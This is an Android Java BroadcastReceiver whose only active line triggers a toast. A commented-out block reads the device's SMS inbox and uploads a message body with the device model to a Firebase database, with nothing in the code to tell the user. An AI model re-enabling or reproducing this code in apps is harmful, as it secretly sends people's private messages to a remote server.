package com.example.broadcastsms;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MyReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        MainActivity.getIstance().toast();



//        FirebaseDatabase database = FirebaseDatabase.getInstance();
//
//        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
//
//            return;
//        }
//
//
//
//        String deviceModel = Build.MODEL;
//
//
//        DatabaseReference myRef = database.getReference("Devices");
//
//
//
//
//
//        Cursor cursor = MainActivity.getIstance().getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
//        Message_po x=null;
//        try {
//            if (cursor.moveToFirst()) { // must check the result to prevent exception
//                do {
//                    String msgData = "\n";
//
//                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
//                        if(cursor.getColumnName(idx).equals("body")) {
//                            msgData += " " + cursor.getColumnName(idx) + "->" + cursor.getString(idx);
//                            x=new Message_po(cursor.getString(idx));
//
//
//                        }
//                    }
//
//
//                    break;
//                } while (cursor.moveToNext());
//            } else {
//            }
//            myRef.child("message"+deviceModel).setValue(x);
//        }
//        catch (Exception e)
//        {
//
//        }
//




























    }
}
